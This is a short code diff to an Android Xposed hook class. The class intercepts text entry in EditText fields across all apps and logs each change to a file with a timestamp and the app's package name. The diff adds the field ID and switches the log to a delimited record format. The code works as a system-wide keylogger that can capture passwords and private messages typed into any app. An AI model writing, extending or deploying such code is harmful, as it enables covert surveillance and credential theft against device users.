@@ -68,7 +68,7 @@ public class Hook implements IXposedHookZygoteInit {
 						@Override
 						public void afterTextChanged(Editable s) {
 							//Write the text of the EditText and the package name of the app running(taken from the EditTexts context)
-							write(et.getContext().getPackageName(), s.toString());
+							write(et.getContext().getPackageName(), et.getId(), s.toString());
 						}
 						
 					});
@@ -80,7 +80,7 @@ public class Hook implements IXposedHookZygoteInit {
 		});
 	}
 	
-	private synchronized void write(String id, String text) {
+	private synchronized void write(String id, String eid, String text) {
 		//Do nothing if the text is empty or its the same as before
 		if (text.equals("") || text.equals(mCache))
 			return;
@@ -99,7 +99,7 @@ public class Hook implements IXposedHookZygoteInit {
 		
 		try {
 			//Write it
-			mWriter.append(now.hour + ":" + now.minute + ":" + now.second + ">" + id + ">" + text);
+			mWriter.append(now.hour + ":" + now.minute + ":" + now.second + "," + id + "," + eid + "," + text + ";");
 			mWriter.newLine();
 			mWriter.flush();
 			//Refresh the cache
